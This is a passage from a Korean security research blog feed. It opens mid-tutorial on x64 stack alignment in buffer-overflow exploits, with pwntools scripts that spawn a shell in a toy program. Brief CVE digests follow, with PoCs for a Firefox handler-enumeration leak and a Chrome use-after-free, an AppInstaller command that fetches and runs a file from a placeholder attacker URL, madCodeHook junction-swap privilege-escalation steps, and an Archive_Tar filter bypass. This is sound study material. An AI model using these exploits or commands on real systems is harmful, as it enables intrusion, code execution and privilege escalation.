뭐라는 거야?</p><p>무슨 소린지 모르겠죠? 설명이 뭐 같이 쓰여있어서 그렇지 사실 아주 간단합니다.</p><pre><code class="hljs c"><span class="hljs-comment">// test.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello stack alignment\\n&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;hello();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><pre><code class="hljs bash">$ gcc -o <span class="hljs-built_in">test</span> test.c -no-pie$ gdb -q <span class="hljs-built_in">test</span></code></pre><p>간단한 예제를 통해 확인해봅시다. 디버깅할 때 거슬리니 PIE는 해제하고 컴파일하세요. 저는 Ubuntu 20.04와 glibc-2.31를 사용했습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/7.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/8.png"></p><pre><code class="hljs bash">pwndbg&gt; r</code></pre><p>정상적으로 호출된 <code>main()</code> 함수의 entry point입니다. 아직 프롤로그를 실행하기 전이니 RSP+8은 16의 배수겠죠?</p><p>RSP : <code>0x7fffffffe038</code></p><p>RSP+8 : <code>0x7fffffffe040</code></p><p>위 스크린샷을 보면 RSP+8은 <code>0x7fffffffe040</code>이므로 16의 배수가 맞습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/9.png"></p><p>그럼 다들 알다시피 call 인스트럭션으로 함수를 호출하면 stack에 return address를 push 하니까 call 인스트럭션을 실행하기 직전엔 RSP가 16의 배수겠죠?</p><p>RSP : <code>0x7fffffffe030</code></p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/10.png"></p><p>그리고 함수 프롤로그에서 <code>push rbp</code>를 하니까 rbp는 항상 16의 배수겠네요?</p><p>RSP : <code>0x7ffffffffdfe0</code></p><p>대충 정리해보면 stack align을 지키면서 함수를 호출하는 흐름은 다음과 같습니다.</p><ol><li>call 실행 직전 RSP는 16의 배수 ( stack align O )</li><li>함수의 entry point에선 RSP+8이 16의 배수 ( stack align X )</li><li>함수의 프롤로그 실행 후 RSP는 16의 배수 ( stack align O )</li><li>RBP는 항상 16의 배수 ( stack align O )</li></ol><p>사실, 함수를 호출할 때 2번 과정에서 잠시 stack align이 깨지고 3번에서 다시 stack align이 맞춰집니다. 여기서 2번만 똑 떼서 “이 것만 지키시면 stack align입니다.”라고 설명을 써놔서 헷갈리는 겁니다. 이래도 이해 안 되시면 4번만 기억하세요. 4번만 신경 써줘도 공격 코드를 짜는데 아무 지장이 없을 겁니다. 더 자세한 설명은 조금 이따 하겠습니다.</p><h1 id="MOVAPS"><a href="#MOVAPS" class="headerlink" title="MOVAPS"></a>MOVAPS</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/11.png"></p><p>이 규칙을 꼭 지켜야 하는가? 물론 아닙니다. 방금 전에도 설명했듯이 유연하게 어겼다가 지켰다가 할 수 있습니다. 그리고 stack alignment는 효율을 높이기 위해 유지한다고도 설명했다시피 지키지 않아도 프로그램이 동작하는데 아무 문제없습니다. 다만 효율이 좀 떨어질 뿐… 물론 예외가 존재하는데 몇몇 intel/AMD cpu에서 SSE instruction을 실행할 때  stack alignment가 깨져있으면 segmentation fault가 발생합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/12.png"></p><p>그리고 <a href="http://qcd.phys.cmu.edu/QCDcluster/intel/vtune/reference/vc181.htm">MOVAPS</a>가 바로 SSE intruction 중 하나입니다. XMM 레지스터끼리 혹은 XMM 레지스터와 메모리 사이에서 double quadword( 16byte ) 크기의 데이터를 옮기는 인스트럭션인데, 메모리의 align 여부를 강제합니다.</p><pre><code class="hljs c">&lt;do_system+<span class="hljs-number">364</span>&gt; movaps xmmword ptr [rsp + <span class="hljs-number">0x50</span>], xmm0</code></pre><p>XMM 레지스터와 메모리 사이에서 데이터를 옮길 때, 메모리의 align이 깨져있으면 general protection( #GP / SIGSEGV ) fault를 발생시킵니다. 그리고 Ubuntu 18.04부터 이 movaps 인스트럭션이 <code>do_system()</code>을 포함한 여러 멀티미디어 오퍼레이션에 추가되어 exploit을 작성할 때 stack alignment를 신경 써야 합니다.</p><h1 id="JMP-vs-CALL-vs-RET"><a href="#JMP-vs-CALL-vs-RET" class="headerlink" title="JMP vs CALL vs RET"></a>JMP vs CALL vs RET</h1><p>그래서 Exploit이랑 stack align이 깨지는 거랑 무슨 상관인데? 그래서 왜 16.04에선 쉘을 띄우던 공격 코드가 18.04부턴 작동 안 하는 건데? 이거를 이해하려면 우선 control intsruction들의 차이를 알아야 합니다. 생각보다 모르는 사람이 많더라고… 각 인스트럭션마다 스택의 변화, 더 자세히 말하자면 RSP의 변화가 어떤지 알아야 합니다.</p><h2 id="1-JMP"><a href="#1-JMP" class="headerlink" title="1. JMP"></a>1. JMP</h2><blockquote><p>Transfers program control to a different point in the instruction stream <strong>without</strong> recording <strong>return information</strong>.</p></blockquote><p>단순히 프로그램의 흐름을 옮김. 인용구를 보면 알겠지만 리턴 정보를 저장하지 않습니다. jmp 인스트럭션으로 인한 스택의 변화는 없다고 생각하시면 됩니다.</p><h2 id="2-CALL"><a href="#2-CALL" class="headerlink" title="2. CALL"></a>2. CALL</h2><p>반면 call 인스트럭션은 프로그램의 흐름을 옮기는 것이 아니라 subroutine에 잠시 들렀다가 돌아오는 것이기 때문에 리턴 정보를 저장합니다. 그리고 그 리턴 정보는 stack에 push 하기 때문에 call 인스트럭션을 실행한 뒤엔 RSP의 값이 8만큼 감소합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/13.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>call hello 인스트럭션이 실행되면 &lt;main+18&gt;을 stack에 push 하겠죠?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/14.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>따라서 정상적으로 호출된 함수의 entry point에선 RSP+8이 16의 배수가 되는 겁니다. 여기서 꼭 기억하셔야 할 것이 Call을 실행한 직후엔 일시적으로 stack align이 깨진다는 겁니다.</p><h2 id="3-RET"><a href="#3-RET" class="headerlink" title="3. RET"></a>3. RET</h2><pre><code class="hljs c">pop ripjmp rip</code></pre><p>call을 설명할 때 sub routine에 잠시 들렀다 돌아간다고 했습니다. 물론 이 모든 동작을 call이 다 하진 않고, 원래의 인스트럭션 스트림으로 다시 돌아가는 동작은  ret이 대신해줍니다.</p><p>ret은 두 인스트럭션을 하나로 합쳐 놨다고 생각하시면 되는데, call이 저장해놓은 리턴 정보를 스택에서 빼내어 jmp 합니다. 즉, RSP값이 8만큼 증가한다는 뜻입니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/15.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>위 스크린샷은 ret을 실행하기 직전의 상황입니다. RSP 값을 보면 아시겠지만 ret을 실행하기 직전엔 stack align이 깨져있습니다. 이는 함수 에필로그의 leave 명령어 혹은 pop rbp의 결과겠죠?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/16.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>그리고 ret을 실행하면 RSP가 8만큼 증가하고 stack align이 다시 맞춰집니다.</p><h2 id="정리"><a href="#정리" class="headerlink" title="정리"></a>정리</h2><ul><li>call : RSP-=8 → 일시적으로 stack align을 깸</li><li>ret : RSP+=8 → leave 명령어로 깨진 stack align을 다시 맞춤</li></ul><h1 id="Abnormal-call"><a href="#Abnormal-call" class="headerlink" title="Abnormal call"></a>Abnormal call</h1><p>자 이쯤 되면 대충 눈치채셨을 거 같은데, BOF공격을 할 때 ret으로 함수를 호출하죠? shellcode를 실행하는 건 논외로 치고, ret2libc( RTL )나 ROP로 BOF exploit을 하게 될 텐데 call이 아니라 ret으로 함수를 호출하기 때문에 stack alignment가 깨지게 되는 겁니다.</p><h2 id="vuln-c"><a href="#vuln-c" class="headerlink" title="vuln.c"></a>vuln.c</h2><pre><code class="hljs c"><span class="hljs-comment">// vuln.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">win</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">char</span> buf[<span class="hljs-number">16</span>];read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">128</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;$ gcc -o vuln vuln.c -no-pie -fno-<span class="hljs-built_in">stack</span>-protector</code></pre><p>정말 간단한 BOF 예제로 확인해보죠. vuln.c를 작성하고 컴파일해줍시다. BOF를 할 거니까 당연히 stack canary는 해제해주세요.</p><h2 id="bof-py"><a href="#bof-py" class="headerlink" title="bof.py"></a>bof.py</h2><pre><code class="hljs python"><span class="hljs-comment"># bof.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)gdb.attach(p)win = <span class="hljs-number">0x401156</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(win)p.sendline(payload)p.interactive()$ python3 bof.py</code></pre><p><code>main()</code>의 return 주소를 <code>win()</code> 함수의 entry point로 덮어쓰는 공격 코드입니다.</p><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/17.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main+45pwndbg&gt; c</code></pre><p><code>main()</code>의 ret에 break point를 걸고 <code>win()</code> 함수가 호출된 후의 stack 상황을 봅시다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/18.png"></p><pre><code class="hljs bash">pwndbg&gt; ni</code></pre><p>ret으로 함수 <code>win()</code>의 entry point에 도달해서 프롤로그를 실행하고 나면 stack alignment가 깨지게 됩니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/19.png"></p><p>컴퓨터는 stack이 항상 align 돼있다고 가정하고 그 상태를 유지하려고 합니다. 즉, <code>win()</code>에서 깨져버린 alignment를 깨진 상태로 유지하게 되고, <code>win()</code> 이후에 호출되는 함수들의 stack alignment는 깨진 상태가 됩니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/20.png"></p><p>그리고 결국 <code>do_system()</code>을 실행하다 movaps에 걸려 segmentation fault를 띄우고 exploit은 실패하게 됩니다.</p><h1 id="RET-sled"><a href="#RET-sled" class="headerlink" title="RET sled"></a>RET sled</h1><p>지금까지 설명한 내용을 이해하셨다면 앞으로 공격 코드를 짜실 때 아무 문제없을 거라 생각합니다. 그래도 여기서 글을 마무리 짓긴 애매하니 해결 방법을 알아보죠.</p><pre><code class="hljs python"><span class="hljs-comment">#bof2.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)win = <span class="hljs-number">0x401156</span>ret = <span class="hljs-number">0x40119a</span> <span class="hljs-comment"># ret sled</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(ret) + p64(win)p.sendline(payload)p.interactive()</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/21.png"></p><pre><code class="hljs bash">$ python3 bof2.py</code></pre><p>네. 정말 별거 없습니다. ret 가젯을 하나 더 추가해서 RSP의 위치를 8만큼 조정해주면 BOF 공격을 할 때 stack alignment를 유지할 수 있습니다. 너무 단순하고 당연해서 더 설명할 게 없네요.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/22.png"></p><p>짠!</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>RET sled 말고도 stack alignment를 유지하면서 ROP 하는 방법은 많습니다. 사실 한 가지 방법 더 보여드리려고 했는데 그건 endbr64랑 CET까지 설명해야 돼서 기회가 되면 따로 글을 작성하겠습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/23.png"></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>bof</tag>
      
      <tag>pwnable</tag>
      
      <tag>stack alignment</tag>
      
      <tag>rtl</tag>
      
      <tag>rop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-15680 : protocol handler infomation disclosure</title>
    <link href="/2020/12/05/fabu1ous/2020-12-05/"/>
    <url>/2020/12/05/fabu1ous/2020-12-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.fortinet.com/blog/threat-research/leaking-browser-url-protocol-handlers?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:+fortinet/blog/threat-research+(Fortinet+Threat+Research+Blog)">leaking browser url/protocol handler</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firebox 78.01</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firefox에서 Protocol Handler를 이용한 Information Disclosure 취약점이 발견되었습니다. Protocol Handler는 응용 프로그램이 자신의 URI scheme를 등록할 수 있는 매커니즘으로 이를 통해 프로세스를 실행할 수 있습니다. 브라우저가 Protocol Handler URI를 사용해 프로세스를 실행하면 “웹사이트에서 이 애플리케이션을 열려고 합니다.”라는 알림이 뜹니다.  </p><p>Firefox가 이미지 태그의 소스를 렌더링 할 때, Protocol Handler의 존재 여부에 따라 렌더링 결과가 다릅니다. 해커는 이점을 악용해 원격으로 victim에 설치된 프로그램 리스트를 알 수 있습니다.</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;존재하는ProtocolHandler://abc&quot;</span>&gt;</span></code></pre><p>victim에 존재하는 Protocol Handler를 이미지 src에 넣으면 broken image에 대한 기본 설정에 따라 Element의 size가 24x24로 렌더링 됩니다.</p><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;존재하지않는ProtocolHandler://abc&quot;</span>&gt;</span></code></pre><p>반면, 존재하지 않는 Protocol Handler를 이미지 src에 넣으면 Element의 size는 0x0으로 설정됩니다.</p><p>따라서 해커는 간단한 JS script로 Element의 width를 검사해 Protocol Handler의 존재 여부를 확인하는 brute force 공격을 할 수 있습니다.</p><pre><code class="hljs javascript">known_handlers = [  ...]  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = knwon_handers.length <span class="hljs-number">-1</span>; i&gt;=<span class="hljs-number">0</span>; i--)&#123;  handler_id = <span class="hljs-string">&#x27;handler_&#x27;</span> + i  $(<span class="hljs-string">&#x27;body&#x27;</span>).append(<span class="hljs-string">&#x27;&lt;img id =&quot;&#x27;</span> + handler_id + <span class="hljs-string">&#x27;&quot;src=&quot;&#x27;</span>+known_handers[i]  + <span class="hljs-string">&#x27;://192.168.133.142/&quot;&gt;&lt;/img&gt;&#x27;</span>)  <span class="hljs-keyword">if</span>($(<span class="hljs-string">&#x27;#&#x27;</span> + handler_id).css(<span class="hljs-string">&#x27;width&#x27;</span>) == <span class="hljs-string">&quot;24px&quot;</span>)&#123;    $(<span class="hljs-string">&#x27;&lt;p&gt;Handler &#x27;</span> + known_handlers[i] + <span class="hljs-string">&#x27;Exists&lt;/p&gt;&#x27;</span>).appendTo(<span class="hljs-string">&#x27;#logbox&#x27;</span>);  &#125;  <span class="hljs-keyword">else</span>&#123;    $(<span class="hljs-string">&#x27;&lt;p&gt;Hander &#x27;</span> + known_handers[i] + <span class="hljs-string">&#x27;Does not exists&lt;/p&gt;&#x27;</span>).appendTo(<span class="hljs-string">&#x27;#logbox&#x27;</span>);  &#125;    $(<span class="hljs-string">&#x27;#&#x27;</span> + hander_id).remove()&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>information disclosure</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Chrome UAF in StopProfiler</title>
    <link href="/2020/12/04/l0ch/2020-12-04/"/>
    <url>/2020/12/04/l0ch/2020-12-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1119865">Chrome UAF in StopProfiler</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Chrome (Operating System: all)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CPU 등의 리소스 사용량을 모니터링할 수 있는 <code>profiler</code> 객체에서 비동기 처리 키워드를 사용한 UAF 취약점이 발견되었습니다. </p><p>해당 취약점의 POC는 다음과 같습니다.</p><pre><code class="hljs jsx">&lt;html&gt;    &lt;body&gt;    &lt;/body&gt;    &lt;script&gt;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gc</span>(<span class="hljs-params"></span>) </span>&#123;            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; ++i) &#123;                <span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>();            &#125;        &#125;        <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">var</span> pf = <span class="hljs-keyword">await</span> performance.profile(&#123; <span class="hljs-attr">sampleInterval</span>: <span class="hljs-number">10</span> &#125;);            <span class="hljs-built_in">console</span>.log(pf);            cnt = <span class="hljs-number">0</span>;            <span class="hljs-built_in">Object</span>.prototype.__defineGetter__(<span class="hljs-string">&quot;then&quot;</span>, <span class="hljs-function">()=&gt;</span>&#123;                <span class="hljs-keyword">if</span>( cnt == <span class="hljs-number">0</span>)&#123;                    cnt ++;                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hello&quot;</span>);                    pf.stop();                    gc();                &#125;            &#125;)            pf.stop();        &#125;        main();    &lt;/script&gt;&lt;/html&gt;</code></pre><pre><code class="hljs jsx"><span class="hljs-keyword">void</span> ProfilerGroup::StopProfiler(ScriptState* script_state,                                 Profiler* profiler,                                 ScriptPromiseResolver* resolver) &#123;...  auto* trace = ProfilerTraceBuilder::FromProfile(      script_state, profile, profiler-&gt;SourceOrigin(), profiler-&gt;TimeOrigin());  resolver-&gt;Resolve(trace);  <span class="hljs-keyword">if</span> (profile)    profile-&gt;Delete();  profilers_.erase(profiler);...</code></pre><p><code>ProfilerGroup::StopProfiler</code> 함수의 resolve는 사용자 정의 함수를 호출할 수 있습니다. </p><p>비동기 함수로 선언한 <code>main</code> 함수에서 <code>await</code> 키워드로 <code>performance.profile</code> 객체를 선언하고 <code>Object.prototype.__defineGetter__</code> 의 사용자 정의 함수와 main에서 <code>stop</code> 을 두 번 호출하게 되면  <code>CpuProfile</code> 객체가 삭제됩니다. 결과적으로 <code>CpuProfile</code> 에서 UAF 취약점을 트리거할 수 있습니다.</p><p>이는 간단하지만 높은 심각성의 UAF 취약점으로, Google은 <code>Profiler::stop</code> 에서 동기 스크립트 실행을 방지하도록 패치했습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://chromium-review.googlesource.com/c/chromium/src/+/2373184">https://chromium-review.googlesource.com/c/chromium/src/+/2373184</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javascript</tag>
      
      <tag>chrome</tag>
      
      <tag>L0ch</tag>
      
      <tag>uaf</tag>
      
      <tag>asynchronous</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Microsoft AppInstaller.exe Arbitrary File Download</title>
    <link href="/2020/12/03/idioth/2020-12-03/"/>
    <url>/2020/12/03/idioth/2020-12-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://twitter.com/notwhickey/status/1333900137232523264">https://twitter.com/notwhickey/status/1333900137232523264</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft AppInstaller</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft App Installer에서 arbitrary file download를 하여 lolbin(<a href="https://www.cynet.com/attack-techniques-hands-on/what-are-lolbins-and-how-do-attackers-use-them-in-fileless-attacks/">living of the land binary</a>)으로 활용할 수 있는 방법이 발견되었습니다.</p><p>웹 서버에서 앱 패키지를 다운로드할 때 과정을 간소화하여 효율적으로 하기 위해 웹 서버에서 직접 앱을 설치할 수 있는 기능을 제공합니다. 웹 페이지에서 앱 패키지를 호스팅 하기 위해서 <code>ms-appinstaller:?source=</code> URI를 사용하여 <code>source=</code>에 명시된 주소에 있는 파일에 대한 앱 다운로드를 진행합니다. 이를 악용하여 해커는 자신의 악성 파일을 source에 작성하여 arbitrary file download을 진행할 수 있고 <code>forfiles</code> 명령어를 통해 앱 패키지 다운로드가 진행된 경로에서 파일을 조건문 등으로 검색하여 실행이 가능합니다.</p><pre><code class="hljs taggerscript">start ms-appinstaller://?source=&lt;hacker-url&gt; &amp;&amp; timeout &lt;sleep-time&gt; &amp;&amp; taskkill /F /IM AppInstaller.exe &gt; NULforfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-symbol">\\</span><span class="hljs-variable">%username%</span><span class="hljs-symbol">\\</span>AppData<span class="hljs-symbol">\\</span>Local<span class="hljs-symbol">\\</span>Packages<span class="hljs-symbol">\\</span>Microsoft.DesktopAppInstaller_8wekyb3d8bbwe<span class="hljs-symbol">\\</span>AC<span class="hljs-symbol">\\</span>INetCache&quot; /S /M * /C &quot;cmd /c if @fsize==&lt;file-size&gt; FOR /F <span class="hljs-symbol">\\</span>&quot;tokens=*<span class="hljs-symbol">\\</span>&quot; <span class="hljs-variable">%g IN (&#x27;type @path&#x27;) do (%</span>g);&quot; &gt; NUL</code></pre><p><img src="/2020/12/03/idioth/2020-12-03/image.png"></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>lolbin</tag>
      
      <tag>lolbas</tag>
      
      <tag>appinstaller</tag>
      
      <tag>arbitrary file download</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-14418 : madCodeHook library LPE</title>
    <link href="/2020/12/02/fabu1ous/2020-12-02/"/>
    <url>/2020/12/02/fabu1ous/2020-12-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.nettitude.com/blog/cve-2020-14418-madcodehook-library-local-privilege-escalation/">CVE-2020-14418</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>All software using MadCodeHook &lt;= v4.1.3</p><ul><li>Cisco AMP &lt;= v7.2.13</li><li>Morphisec Unified Threat Prevention Platform &lt;= v4.1.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>madCodeHook은 다양한 API hooking 기능을 지원하는 third party 라이브러리입니다. madCodeHook라이브러리에 포함된 <code>ExprevDriver.sys</code>라는 드라이버는 유저 모드 프로세스에 <code>Protector32.dll</code> 혹은 <code>Protector64.dll</code>을 삽입해 그 프로세스를 보호 및 감시할 수 있습니다. DLL injection 공격을 방지하는 기능과 프로세스 모니터링 기능을 제공하므로 몇몇 보안 제품에서 madCodeHook 라이브러리를 사용합니다.</p><p>아이러니하게도 DLL injection을 방지하기 위해 사용되는 <code>ExprevDriver.sys</code> 드라이버에 path redirection을 이용한 toctou 취약점이 존재하고, 해커는 이를 악용해 DLL injection을 할 수 있습니다.</p><ol><li><p>실제  <code>Protector64.dll</code>이 존재하는 디렉터리를 가리키는 juction을 생성합니다.</p><pre><code class="hljs powershell">“mklink /J C:\users\&lt;username&gt;\Desktop\exprev C:\Program Files\Cisco\AMP\exprev”</code></pre></li><li><p><code>ExprevDriver.sys</code>에 IOCTL을 넘겨줍니다.</p><pre><code class="hljs latex">“C:<span class="hljs-tag">\<span class="hljs-name">users</span></span><span class="hljs-tag">\<span class="hljs-name">&lt;</span></span>username&gt;<span class="hljs-tag">\<span class="hljs-name">Desktop</span></span><span class="hljs-tag">\<span class="hljs-name">exprev</span></span><span class="hljs-tag">\<span class="hljs-name">Protector</span></span>64.dll”</code></pre><p>IOCTL을 사용해  <code>ExprevDriver.sys</code>가 삽입할 DLL의 경로와 대상 프로세스를 지정할 수 있습니다.  <code>ExprevDriver.sys</code>는 DLL을 삽입하기 전에 DLL의 전자서명을 검증하는 단계를 거치는데,  IOCTL로 설정된 경로를 사용합니다. Protector64.dll의 경로를 1번에서 만들어 둔 juction으로 설정해줍니다.</p></li><li><p>디렉터리 juction을 삭제하고 가짜 <code>Protector64.dll</code>을 생성합니다.</p><p>DLL의 전자서명 검증 이후 juction을 삭제하고 2번 단계에서 지정해준 경로에 <code>Protector64.dll</code>라는 이름의 악성 DLL을 생성합니다.</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>toctou</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-28948/28949 : Multiple vulnerabilities through filename manipulation</title>
    <link href="/2020/12/01/l0ch/2020-12-01/"/>
    <url>/2020/12/01/l0ch/2020-12-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/pear/Archive_Tar/issues/33">Archive_Tar Issue - multiple vulnerabilities through filename manipulation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>PEAR Archive_Tar</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PEAR Archive_Tar는 PHP에서 TAR 파일을 처리하는 데 사용하는 오픈소스 라이브러리입니다. 해당 라이브러리에서 phar unseirialization과 arbitrary file overwrite 두 가지 취약점이 발견되었습니다.</p><br>첫 번째 취약점(CVE-2020-28948)은 scheme 필터링 우회를 통한 unserialization 취약점입니다.<p>Archive_Tar에는 unserialization 공격을 방지하기 위해 다음과 같은 코드가 존재합니다.</p><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_maliciousFilename</span>(<span class="hljs-params">$file</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;phar://&#x27;</span>) === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span> || strpos($file, <span class="hljs-string">&#x27;..\\\\&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>그러나 <code>PHAR://malicious_file.phar</code> 과 같이 대문자로 작성하면 해당 코드를 우회해 unserialization을 통한 obejct injection이 가능합니다.<br><br></p><p>두 번째 취약점(CVE-2020-28949)은 Archive_Tar에서 stream wrapper를 체크하지 않아 발생하는 arbitrary file overwrite 취약점입니다. 이 취약점 또한 CVE-2020-28948과 같은 코드에서 발생한 취약점으로, <code>file://</code> scheme에 대한 검사를 하지 않아 해커가 임의 파일을 덮어쓸 수 있습니다. php가 루트 권한으로 실행되었다면 <code>/etc/passwd</code> 파일을 포함한 시스템 파일 또한 덮어쓸 수 있습니다.</p><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_maliciousFilename</span>(<span class="hljs-params">$file</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;://&#x27;</span>) === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span> || strpos($file, <span class="hljs-string">&#x27;..\\\\&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>이 